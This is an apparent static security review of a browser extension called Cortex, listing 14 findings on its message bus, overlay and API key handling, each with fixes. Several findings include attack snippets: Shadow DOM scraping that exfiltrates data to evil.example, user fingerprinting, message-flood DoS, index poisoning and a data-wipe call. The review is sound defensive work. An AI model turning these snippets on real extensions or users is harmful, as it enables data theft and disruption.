# Security Review 1 — Trust Boundaries and Message Bus

**Reviewed against commit:** `7e64448c7e66c32913b7c4c831b7da159ca813da`  
**Reviewer:** Cursor + 2026-05-17  
**Scope:** Message bus, content script surface, scripting injection.  
**Method:** Static analysis only (no extension runtime execution).

**Remediation:** Addressed in working tree after this review (closed shadow root, message-bus hardening, Gemini header auth, history fetch guards, etc.).

---

## Summary

- **12 findings:** 0 critical, **2 high**, **6 medium**, **3 low**, **1 informational**
- **11 items verified safe** (listed below)
- **4 items unable to verify** (runtime / platform-dependent)

**Threat model note:** `manifest.json` has **no** `externally_connectable` and **no** `onMessageExternal` listeners. Arbitrary websites **cannot** call `chrome.runtime.sendMessage` into Cortex. The primary boundary is **extension code (content scripts) running on attacker-controlled pages** vs **service worker / offscreen / IndexedDB**.

**No store-removal red flags** identified. The highest practical risk is **host-page script reading the open Shadow DOM** when the user opens Cortex on a malicious site.

---

## Findings

### FINDING-001: Open Shadow DOM lets hostile pages read overlay contents

- **Severity:** High
- **Location:** `src/content/overlay.ts:238`
- **Description:** The overlay attaches an **open** shadow root (`attachShadow({ mode: "open" })`). Page JavaScript on the same document shares the DOM tree and can access `document.getElementById("cortex-overlay-root").shadowRoot`, reading search hits, snippets, Ask thread text, digest output, and citations rendered in the panel.
- **Attack scenario:** User installs Cortex and visits `https://evil.example/`. The page opens Cortex (shortcut, toolbar on another tab, or `window.dispatchEvent(new CustomEvent("cortex-open-search"))` — see FINDING-012). The attacker runs:

```javascript
function stealCortex() {
  const host = document.getElementById("cortex-overlay-root");
  const sr = host?.shadowRoot;
  if (!sr) return;
  const hits = [...sr.querySelectorAll(".cortex-hit-title, .cortex-hit-snippet, .cortex-hit-host")]
    .map((el) => el.textContent);
  const chat = [...sr.querySelectorAll(".cortex-msg--user, .cortex-msg-content")]
    .map((el) => el.textContent);
  navigator.sendBeacon("https://evil.example/collect", JSON.stringify({ hits, chat }));
}
setInterval(stealCortex, 500);
```

Any search or Ask interaction on that tab exfiltrates **local library content shown in the UI** to the page origin.

- **Impact:** Partial library exfiltration (titles, snippets, URLs, questions/answers visible in the panel) to a malicious site without breaking extension isolation APIs. Violates user expectation that “nothing leaves the machine” when the hostile origin is involved.
- **Recommendation:** Use `attachShadow({ mode: "closed" })` and keep all page-derived rendering inside the shadow tree via `esc()` / `textContent` (already done). If open mode is required for debugging, gate it behind `__CORTEX_DEBUG__` only.
- **Effort to fix:** small

---

### FINDING-002: Gemini API key sent as URL query parameter

- **Severity:** High
- **Location:** `src/lib/chat/gemini-client.ts:15`, `src/lib/chat/llm-router.ts:100-105`
- **Description:** Cloud chat calls `generativelanguage.googleapis.com` with `?key=${encodeURIComponent(options.apiKey)}`. The key is not limited to an `Authorization` header.
- **Attack scenario:** User enables cloud chat and saves a key in options. On each Ask/Digest cloud request, the key appears in the request URL. A corporate HTTPS proxy, browser extension with `webRequest`, malware logging URLs, or error-reporting pipeline that records request URLs may capture:

```
https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:streamGenerateContent?key=AIza...redacted...&alt=sse
```

If the user copies a HAR file or shares devtools network logs, the full key is exposed. (`gemini-client.ts:35-36` also embeds API error bodies in thrown `Error` messages, which may be shown in UI error paths.)

- **Impact:** API key theft → unauthorized Gemini usage and billing on the user’s Google project.
- **Recommendation:** Use Google’s supported header-based authentication if available for this endpoint; otherwise document the risk prominently and ensure error paths never log full URLs. Scrub `key=` from any diagnostic output.
- **Effort to fix:** medium (depends on API surface)

---

### FINDING-003: Offscreen handlers accept messages without sender checks; content scripts can bypass SW rate limits

- **Severity:** Medium
- **Location:** `src/offscreen/offscreen.ts:96-161`, `src/background/service-worker.ts:910-911`
- **Description:** The service worker **ignores** `CORTEX_EMBED_TEXT` and `CORTEX_SEARCH_RUN` (returns `false` so other listeners handle them). The offscreen listener does **not** verify `sender.id` or `sender.url`. Any extension context with `chrome.runtime.sendMessage`—including **content scripts on arbitrary http(s) pages**—can invoke offscreen work directly, bypassing SW buckets such as `search:${tabId}` (60/min) on `CORTEX_SEARCH`.
- **Attack scenario:** On `https://evil.example/`, Cortex’s content script is injected. Attacker cannot run JS in the isolated world, but a **buggy future bridge** is not required for **availability** attacks: compromised build aside, a user script in the isolated world is not the model—however, **any** code path that calls `sendMessage` from content (including manual devtools in isolated world) can run:

```javascript
// In content-script isolated world (e.g. compromised dependency)
for (let i = 0; i < 500; i++) {
  chrome.runtime.sendMessage({
    type: "CORTEX_SEARCH_RUN",
    query: "x".repeat(5_000_000),
  });
}
```

Each message triggers `runAdvancedSearch` in offscreen (`offscreen.ts:144-150`) with no length cap on `query` before `String(msg.query ?? "")`.

- **Impact:** CPU/memory DoS in offscreen (WASM inference + full chunk scan), extension hang, battery drain.
- **Recommendation:** Handle `CORTEX_EMBED_TEXT` / `CORTEX_SEARCH_RUN` **only** in the service worker (or offscreen with strict `sender.id === chrome.runtime.id` **and** `sender.url` starts with `chrome-extension://`). Reject messages from `sender.tab` (content-script) origins for these types. Enforce query/text length limits in one place.
- **Effort to fix:** medium

---

### FINDING-004: `CORTEX_SEARCH` has no query length limit

- **Severity:** Medium
- **Location:** `src/background/service-worker.ts:1122-1128`, `src/offscreen/offscreen.ts:147-149`, `src/lib/search-engine.ts` (via `runAdvancedSearch`)
- **Description:** Ask questions are capped at `CHAT_LIMITS.MAX_QUESTION_CHARS` (12,000) (`service-worker.ts:976-983`), but `CORTEX_SEARCH` passes `String((msg as { query?: string }).query || "")` with **no maximum length**. Embedding path truncates at 8,000 chars (`search-engine.ts:272`), but BM25 still tokenizes the full string.
- **Attack scenario:** Content script (or overlay on a hostile page) sends:

```javascript
chrome.runtime.sendMessage({
  type: "CORTEX_SEARCH",
  query: "a ".repeat(5_000_000),
});
```

Rate limit is 60/min per tab (`service-worker.ts:1124`), but each call can still allocate and scan a multi-megabyte query string.

- **Impact:** Memory pressure and UI freeze; degraded availability.
- **Recommendation:** Reuse `CHAT_LIMITS` or add `MAX_SEARCH_QUERY_CHARS` (e.g. 2,000–8,000); reject oversize at SW before `searchViaOffscreen`.
- **Effort to fix:** small

---

### FINDING-005: `CORTEX_INDEX` does not cap payload size before chunking

- **Severity:** Medium
- **Location:** `src/background/service-worker.ts:915-938`, `src/lib/chunking.ts:19-38`
- **Description:** Indexing checks minimum text length and rate limits per domain (`service-worker.ts:917-918`, `931-936`) but does not enforce `STORAGE_LIMITS.MAX_DOCUMENT_TEXT_BYTES` (1,000,000 in `limits.ts`) on `payload.text` before `chunkArticle()`. `wordsOf()` splits the entire string; chunk count is capped at 36, but huge inputs still cause large allocations.
- **Attack scenario:** Content script sends an index payload with multi-megabyte `text` (synthetic DOM or crafted `sendRuntimeMessage` from isolated world):

```javascript
chrome.runtime.sendMessage({
  type: "CORTEX_INDEX",
  payload: {
    url: location.href,
    title: "x",
    text: "word ".repeat(2_000_000),
    summary: "y",
    visitedAt: Date.now(),
  },
});
```

- **Impact:** SW/IDB slowdown, storage churn, DoS.
- **Recommendation:** Reject `payload.text.length > STORAGE_LIMITS.MAX_DOCUMENT_TEXT_BYTES` (or stricter) before `commitIndexPayload`; align with chunking caps.
- **Effort to fix:** small

---

### FINDING-006: `CORTEX_INDEX` URL is not bound to the sender tab

- **Severity:** Medium
- **Location:** `src/background/service-worker.ts:915-938`, `src/content/main.ts:71-79`
- **Description:** `shouldSkipIndexing` gates on `payload.url` (`service-worker.ts:922-924`) but never compares `payload.url` to `sender.tab?.url`. The content script normally sends `location.href`, but the handler trusts any string the sender supplies.
- **Attack scenario:** On `https://evil.example/`, modified or compromised content script sends:

```javascript
chrome.runtime.sendMessage({
  type: "CORTEX_INDEX",
  payload: {
    url: "https://careers.legitimate-company.com/",
    title: "CEO confirms acquisition",
    text: "Fabricated body text …",
    summary: "Fake summary",
    visitedAt: Date.now(),
  },
});
```

Legitimate URL appears in search/Ask citations; user may trust provenance.

- **Impact:** Integrity poisoning of the local index (false attribution), social engineering via search/Ask.
- **Recommendation:** Require `sender.tab?.url` and normalize/compare to `payload.url` (or derive URL only in SW from `sender.tab`). Reject mismatches unless `historyImport` internal path.
- **Effort to fix:** small

---

### FINDING-007: History import fetches full HTML with no response size limit

- **Severity:** Medium
- **Location:** `src/lib/history-import.ts:58-74`, `src/background/service-worker.ts:381-387`
- **Description:** `fetchHtmlForHistory` uses `credentials: "omit"` (good) but calls `await r.text()` with no `Content-Length` check or byte cap.
- **Attack scenario:** User’s history contains a URL that returns a multi-gigabyte response (intentional or compromised host). During import, offscreen/SW work parses HTML via `extractPageTextFromHtml` (`service-worker.ts:383`).

- **Impact:** Memory exhaustion, extension crash (availability).
- **Recommendation:** Stream with a max bytes cap (e.g. 2–5 MB); abort fetch when exceeded.
- **Effort to fix:** small

---

### FINDING-008: History import skips sensitive-hostname heuristic

- **Severity:** Medium
- **Location:** `src/background/service-worker.ts:567-572`, `370-373`
- **Description:** `shouldSkipIndexing(..., { historyImport: true })` disables `looksSensitiveHostname` for history backfill. Live indexing applies the heuristic; history import does not.
- **Attack scenario:** User runs “Import history” in options. Visited `https://mybank.com/account` entries are fetched and indexed (subject to `ALWAYS_SKIP_DOMAINS` only), storing page text in IndexedDB even if the user would never re-visit with live indexing.

- **Impact:** Sensitive browsing history content persisted locally beyond user expectations; larger blast radius if device is shared or backup is extracted.
- **Recommendation:** Apply the same sensitive-hostname and path heuristics to history import, or require explicit opt-in for “include sensitive domains.”
- **Effort to fix:** small

---

### FINDING-009: History import can request internal / RFC1918 URLs from browser history

- **Severity:** Medium
- **Location:** `src/lib/history-import.ts:58-74`, `src/background/service-worker.ts:346-351`, `dedupeHistoryItems` (`history-import.ts:127`)
- **Description:** URLs come from `chrome.history.search` (trusted API), normalized to http(s) only. There is no block for localhost, `.local`, or private IP ranges before `fetch()`.
- **Attack scenario:** User previously visited `http://192.168.1.1/` or `http://127.0.0.1:8080/admin`. History import fetches from the extension context (`credentials: "omit"`) and indexes response text. Attacker who later compromises overlay on a web page could read indexed content via FINDING-001; physical attacker benefits from local index.

- **Impact:** Internal network content may be stored in IndexedDB; organizational SSRF-style exposure from the user’s own browser history.
- **Recommendation:** Denylist `localhost`, `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, link-local, and `.local` hostnames for history fetch.
- **Effort to fix:** medium

---

### FINDING-010: `window.__cortex_injected` enables Cortex fingerprinting

- **Severity:** Medium
- **Location:** `src/content/main.ts:155`
- **Description:** Content script sets `window.__cortex_injected = true` on the shared `window` object visible to page scripts.
- **Attack scenario:** Any site probes:

```javascript
if (window.__cortex_injected) {
  fetch("https://metrics.evil.example/cortex-installed");
}
```

- **Impact:** Websites can detect Cortex users (privacy / targeted attacks).
- **Recommendation:** Avoid page-visible globals; use a `chrome.runtime.sendMessage` ping from SW only, or a closed shadow marker.
- **Effort to fix:** small

---

### FINDING-011: Destructive `CORTEX_CLEAR_ALL_DATA` has no sender-surface guard in SW

- **Severity:** Low
- **Location:** `src/background/service-worker.ts:1227-1239`, `src/options/options.ts:355-363`
- **Description:** Options UI shows `confirm()` before delete, but the SW handler accepts the message from **any** extension sender with matching `sender.id`. It does not require `sender.url` to be the options page. No content-script code path sends this today.
- **Attack scenario:** If isolated-world XSS or a compromised content script ever runs:

```javascript
chrome.runtime.sendMessage({ type: "CORTEX_CLEAR_ALL_DATA" }, console.log);
```

the library is wiped with no second confirmation.

- **Impact:** Destruction of user data (integrity/availability).
- **Recommendation:** Restrict to `sender.url?.startsWith(chrome.runtime.getURL("options.html"))` or a dedicated internal capability flag.
- **Effort to fix:** small

---

### FINDING-012: Host page can dispatch `cortex-open-search` to open overlay

- **Severity:** Low
- **Location:** `src/content/overlay.ts:184`, `src/background/service-worker.ts:590-596`
- **Description:** Overlay listens on `window` for `cortex-open-search`. SW can dispatch the same event via `executeScript` with a fixed function. Page scripts share `window` and may dispatch the event.
- **Attack scenario:**

```javascript
window.dispatchEvent(new CustomEvent("cortex-open-search"));
```

Combined with FINDING-001, attacker lures user to open overlay then scrapes shadow DOM.

- **Impact:** UX annoyance; facilitates phishing (“use Cortex here”) and pairs with overlay readout.
- **Recommendation:** Listen only for extension-originated messages (`CORTEX_OPEN_SEARCH`) or use a secret `detail.token` set by SW when dispatching.
- **Effort to fix:** small

---

### FINDING-013: Options “recent visits” uses unsanitized URLs in `href`

- **Severity:** Low
- **Location:** `src/options/options.ts:118-123`
- **Description:** Recent list sets `a.href = r.url` without `safeHttpHttpsHref()`. Indexed URLs are expected to be http(s) from content scripts, but poisoned DB rows (FINDING-006) could store unusual schemes if introduced.
- **Attack scenario:** After index poisoning with a stored `javascript:...` or `data:...` URL (if ever accepted), opening Options and clicking the recent link executes in the **extension options page** origin.

- **Impact:** Low in practice while URLs are http(s)-only; regression risk if URL validation loosens.
- **Recommendation:** Use `safeHttpHttpsHref(r.url) ?? "#"` for options and popup recent links.
- **Effort to fix:** small

---

### FINDING-014: Gemini API key transits BroadcastChannel inside extension

- **Severity:** Informational
- **Location:** `src/lib/extension-bus.ts:7-21`, `src/background/service-worker.ts:997-1004`
- **Description:** `CortexBusInbound` includes full `ChatSettings` with `geminiApiKey` on the `cortex-extension-v1` channel. Web pages cannot subscribe (channel is extension-origin). Risk is limited to other extension contexts or future listeners.
- **Attack scenario:** Malicious **extension-page** code (not web page) posts a listener on the same channel name and logs inbound messages. Not exploitable from normal websites.

- **Impact:** Defense-in-depth only; key exposure within extension process boundary.
- **Recommendation:** Pass a boolean `cloudEnabled` to offscreen and read the key only in offscreen from `chrome.storage.local`, or strip key before `postMessage` if offscreen can load settings itself.
- **Effort to fix:** small

---

## Items verified safe

| Item | Location | Justification |
|------|----------|---------------|
| No external message API | `manifest.json` (full file) | No `externally_connectable`; web origins cannot message the extension by ID. |
| SW sender ID check | `service-worker.ts:906-908` | Rejects foreign extensions. |
| `CORTEX_OPEN_TAB` scheme gate | `service-worker.ts:1279-1294`, `url-security.ts:5-17` | `javascript:`, `chrome://`, `file://` rejected; only http(s) passed to `tabs.create`. |
| `CORTEX_PING` race (page responds first) | `main.ts:159-163`, `service-worker.ts:796-811` | Page JS cannot call `sendResponse` on extension messages; ping only checks `ok === true` then may inject `content.js`—no trust of attacker-controlled payload shape. |
| `executeScript` parameters | `service-worker.ts:591-625, 818-821` | Only `files: ["content.js"]` or fixed `func` dispatching `cortex-open-search`; no user-controlled code strings. |
| Search hit / error HTML in overlay | `overlay.ts:34-37`, `1355-1435` | Page-derived titles, snippets, evidence use `esc()`; URLs use `safeHttpUrl()` / `safeHttpHttpsHref`. |
| Chat assistant rendering | `overlay.ts:725-765`, `860-880` | User/assistant content via `textContent` / `appendTextWithUrls` + `safeHttpUrl` for links. |
| Digest UI (main path) | `overlay.ts:1077-1228` | Narrative/topics use `textContent`; links use `safeHttpUrl`. |
| Index path sanitization | `extract.ts:91-136`, `main.ts:55-59` | DOM sanitized before Readability; live index sends text fields not raw HTML. |
| History fetch cookies | `history-import.ts:60-61` | `credentials: "omit"` prevents authenticated cookie replay on fetch. |
| Options blocklist chips | `options.ts:46-67` | Domains inserted via `createTextNode`, not `innerHTML`. |
| `INNERHTML_AUDIT.md` static templates | `overlay.ts:248-276`, `642-643`, `854-855` | Static SVG / copy; user data paths checked still use `esc()` or `textContent`. |

---

## Items unable to verify

1. **Private-network fetch from extension** — Whether `fetch("http://127.0.0.1/")` succeeds under current Chrome Private Network Access rules for MV3 extensions requires runtime testing on Chrome 116+.
2. **BroadcastChannel origin isolation** — Assumed web pages cannot join `cortex-extension-v1`; confirm with a two-origin test harness in Review 1 follow-up.
3. **Production `devLog` / HAR leakage** — `extension-logger.ts` strips console in production builds; whether Gemini URLs appear in crash reports depends on build flags and user devtools usage.
4. **Side panel framing** — `search-shell.html` relies on extension CSP; whether arbitrary sites can frame `chrome-extension://` pages is browser-dependent (typically blocked).

---

## Recommended next steps

1. **FINDING-001 (open shadow root)** — Highest user-impact fix; pair with FINDING-012 hardening. Small PR + regression test that `shadowRoot` is null from `document` in a content-script test harness.
2. **FINDING-002 (API key in URL)** — Review Gemini auth options; scrub logs/errors. Do before promoting cloud chat widely.
3. **FINDING-003 + FINDING-004** — Centralize privileged operations in SW with sender checks and length limits; single PR for message-bus hardening.
4. **FINDING-006** — Bind index URL to `sender.tab.url` to stop provenance spoofing.
5. **FINDING-007 + FINDING-009** — History import fetch caps and internal-IP blocklist.
6. **FINDING-008** — Align history import privacy gates with live indexing.
7. **FINDING-005, 010, 011, 013** — Batch as defense-in-depth hardening PRs after High/Medium items.

---

## Appendix: Message handler matrix (quick reference)

| Message | Senders (observed) | SW validation | Notes |
|---------|-------------------|---------------|-------|
| `CORTEX_INDEX` | `content/main.ts` | Rate limit, `shouldSkipIndexing`, min length | No max length; URL not tied to tab |
| `CORTEX_SEARCH` | `overlay.ts` | Rate limit 60/min | No query max length |
| `CORTEX_CHAT_*` | `overlay.ts` | Question max 12k; numeric `conversationId` | IDOR N/A (single user) |
| `CORTEX_DIGEST_START` | `overlay.ts` | Range enum; rate limit | |
| `CORTEX_CLEAR_ALL_DATA` | `options.ts` | None | Confirm only in UI |
| `CORTEX_OPEN_TAB` | `overlay.ts` | `safeHttpHttpsHref` | Verified safe |
| `CORTEX_HISTORY_IMPORT_*` | `options.ts` | Bounds on days/maxUrls | |
| `CORTEX_EMBED_TEXT` / `CORTEX_SEARCH_RUN` | SW + **any** `sendMessage` | Offscreen: text slice 8k only | **No sender check** |
| `CORTEX_OPEN_SEARCH_SHELL` | `side-panel-launcher.ts` | Not handled in SW | Handled in shell `overlay.ts` |
| Bus `chat-run` / `digest-run` | SW → offscreen | Settings include API key | Extension-internal |
